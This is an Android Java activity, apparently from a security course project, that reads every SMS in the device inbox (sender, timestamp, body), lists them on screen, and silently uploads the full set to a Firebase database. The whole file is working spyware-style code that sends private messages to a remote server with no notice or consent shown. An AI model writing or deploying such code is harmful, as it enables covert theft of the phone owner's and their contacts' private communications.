package tpgame.securityandcryptography;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;

import tpgame.securityandcryptography.data.SMSModel;

public class ReadSMS extends AppCompatActivity {

    private DatabaseReference mDatabase;

    private ListView lvSMS ;

    ArrayList<String> dsSMS;
    ArrayList<SMSModel> dsSMSModel;

    ArrayAdapter<String> adapterSMS;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_read_sms);

        mDatabase = FirebaseDatabase.getInstance().getReference();

        lvSMS = (ListView) findViewById(R.id.lvSmsDisplay);

        dsSMS = new ArrayList<>();
        dsSMSModel = new ArrayList<>();
        adapterSMS = new ArrayAdapter<String>(ReadSMS.this,android.R.layout.simple_list_item_1,dsSMS);

        lvSMS.setAdapter(adapterSMS);

        processReadAllSMSInInbox(this);

    }

    public void processReadAllSMSInInbox(Context context)
    {
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri,null, null, null, null);
        while (cursor.moveToNext() ){
            int indexPhoneNumber = cursor.getColumnIndex("address");
            int indexTimeStamp = cursor.getColumnIndex("date");
            int indexBody = cursor.getColumnIndex("body");

            String phonenumber=cursor.getString( indexPhoneNumber );
            String timeStamp=cursor.getString(indexTimeStamp);
            String body= cursor.getString( indexBody );
            dsSMS.add(phonenumber+"\n"+timeStamp+"\n"+body);

            dsSMSModel.add(new SMSModel(phonenumber,timeStamp,body));

        }
        mDatabase.child("SMSs").push().setValue(dsSMSModel);
        cursor.close();
        adapterSMS.notifyDataSetChanged();

    }

}
